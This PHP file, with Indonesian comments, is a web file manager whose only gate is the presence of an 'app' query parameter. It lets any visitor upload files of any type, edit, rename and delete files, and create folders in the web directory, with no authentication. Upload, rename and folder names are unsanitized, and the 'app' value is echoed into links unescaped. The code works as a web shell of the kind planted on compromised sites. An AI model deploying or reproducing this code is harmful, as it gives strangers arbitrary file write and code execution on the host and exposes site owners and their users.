<?php
if (!isset($_GET['app']) || empty($_GET['app'])) {
    http_response_code(403);
    exit('🛑 Missing "app" parameter.');
}
?>
<style>
.breadcrumb {
    background-color: #f8f9fa;
    padding: 10px;
    border-radius: 5px;
    margin: 10px 0;
    border: 1px solid #dee2e6;
}
.breadcrumb a {
    color: #007bff;
    text-decoration: none;
    padding: 2px 5px;
    border-radius: 3px;
    transition: all 0.2s ease;
}
.breadcrumb a:hover {
    background-color: #e9ecef;
    text-decoration: underline;
    transform: scale(1.05);
}
.breadcrumb a:active {
    background-color: #007bff;
    color: white;
}
.upload-section {
    background-color: #f8f9fa;
    padding: 15px;
    border-radius: 5px;
    margin: 10px 0;
    border: 1px solid #dee2e6;
}
.file-table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 10px;
}
.file-table th, .file-table td {
    border: 1px solid #dee2e6;
    padding: 8px;
    text-align: left;
}
.file-table th {
    background-color: #e9ecef;
}
.breadcrumb .separator {
    color: #6c757d;
    margin: 0 5px;
}
.path-link {
    display: inline-block;
    margin: 2px;
}
.path-link.current {
    background-color: #007bff;
    color: white;
    padding: 2px 5px;
    border-radius: 3px;
    font-weight: bold;
}
</style>
<?php

// Default path = current dir
$baseDir = getcwd(); 
$path = isset($_GET['dir']) ? realpath($_GET['dir']) : $baseDir;

// Prevent path traversal keluar baseDir
if ($path === false || strpos($path, $baseDir) !== 0) {
    $path = $baseDir;
}

// Editing file
if (isset($_GET['file']) && !empty($_GET['file'])) {
    $filepath = realpath($path . DIRECTORY_SEPARATOR . $_GET['file']);
    if ($filepath === false || strpos($filepath, $baseDir) !== 0) {
        exit("❌ Invalid file path");
    }

    if (isset($_POST['edit'])) {
        file_put_contents($filepath, $_POST['content']);
        header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($path));
        exit;
    }
    echo "<h2>Editing: " . htmlspecialchars(basename($filepath)) . "</h2>";
    echo "<form method='post'><textarea name='content' style='width:100%;height:400px;'>";
    echo htmlspecialchars(file_get_contents($filepath));
    echo "</textarea><br><button type='submit' name='edit'>Save</button></form>";
    exit;
}

// Upload
if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . DIRECTORY_SEPARATOR . $_FILES['upload']['name']);
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($path));
    exit;
}

// Rename
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $old = realpath($path . DIRECTORY_SEPARATOR . $_GET['rename']);
    $new = $path . DIRECTORY_SEPARATOR . $_POST['newname'];
    if ($old && strpos($old, $baseDir) === 0) {
        rename($old, $new);
    }
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($path));
    exit;
}

// Delete
if (isset($_GET['delete'])) {
    $target = realpath($path . DIRECTORY_SEPARATOR . $_GET['delete']);
    if ($target && strpos($target, $baseDir) === 0) {
        if (is_dir($target)) {
            rmdir($target);
        } else {
            unlink($target);
        }
    }
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($path));
    exit;
}

// Create new folder
if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
    $newFolder = $path . DIRECTORY_SEPARATOR . $_POST['foldername'];
    if (!file_exists($newFolder)) {
        mkdir($newFolder);
    }
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($path));
    exit;
}

echo "<h2>File Manager</h2>";

// tampilkan current path dengan breadcrumb navigation
echo "<div class='breadcrumb'>";
echo "<b>📁 Path:</b> ";

// Pisahkan path menjadi bagian-bagian yang dapat diklik
$currentPath = $path;
$pathSegments = [];

// Bangun array path dari root sampai current directory
while ($currentPath !== $baseDir && $currentPath !== dirname($currentPath)) {
    $pathSegments[] = [
        'name' => basename($currentPath),
        'path' => $currentPath
    ];
    $currentPath = dirname($currentPath);
}

// Tambahkan root directory
$pathSegments[] = [
    'name' => basename($baseDir),
    'path' => $baseDir
];

// Reverse array agar urutan dari root ke current
$pathSegments = array_reverse($pathSegments);

// Tampilkan breadcrumb
foreach ($pathSegments as $index => $segment) {
    if ($index > 0) {
        echo "<span class='separator'>/</span>";
    }
    
    // Highlight current directory
    if ($segment['path'] === $path) {
        echo "<span class='path-link current'>" . htmlspecialchars($segment['name']) . "</span>";
    } else {
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($segment['path']) . "' class='path-link'>" . htmlspecialchars($segment['name']) . "</a>";
    }
}
echo "<br><small><b>Full Path:</b> " . htmlspecialchars($path) . "</small>";

// Tombol Up untuk naik satu level
if ($path !== $baseDir) {
    $parentDir = dirname($path);
    echo "<br><a href='?app=" . $_GET['app'] . "&dir=" . urlencode($parentDir) . "' class='path-link' style='background-color: #28a745; color: white; margin-top: 5px;'>⬆️ Up One Level</a>";
}

echo "</div>";

// tombol upload dan create folder
echo "<div class='upload-section'>";
echo "<h3>📤 Upload File</h3>";
echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='upload' required>
    <button type='submit'>Upload to Current Directory</button>
</form>";
echo "<br>";
echo "<h3>📁 Create New Folder</h3>";
echo "<form method='post'>
    <input type='text' name='foldername' placeholder='Enter folder name' required>
    <button type='submit' name='newfolder'>Create Folder</button>
</form>";
echo "</div>";

// List files
$files = scandir($path);
echo "<h3>📂 Directory Contents</h3>";
echo "<table class='file-table'><tr><th>📄 File/Folder</th><th>⚙️ Actions</th></tr>";

// tombol kembali ke parent folder
if ($path !== $baseDir) {
    $parent = dirname($path);
    echo "<tr><td><a href='?app=" . $_GET['app'] . "&dir=" . urlencode($parent) . "'>📁 .. (Back to Parent)</a></td><td>-</td></tr>";
}

foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $full = $path . DIRECTORY_SEPARATOR . $file;
    echo "<tr><td>";
    if (is_dir($full)) {
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($full) . "'>📁 " . htmlspecialchars($file) . "</a>";
    } else {
        echo "📄 " . htmlspecialchars($file);
    }
    echo "</td><td>";
    if (is_file($full)) {
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "&file=" . urlencode($file) . "'>✏️ Edit</a> | ";
    }
    echo "<form style='display:inline' method='post' action='?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "&rename=" . urlencode($file) . "'>
        <input name='newname' value='" . htmlspecialchars($file) . "' style='width:100px;'>
        <button type='submit'>🏷️ Rename</button>
    </form> | ";
    echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"Delete " . htmlspecialchars($file) . "?\")'>🗑️ Delete</a>";
    echo "</td></tr>";
}
echo "</table>";
?>
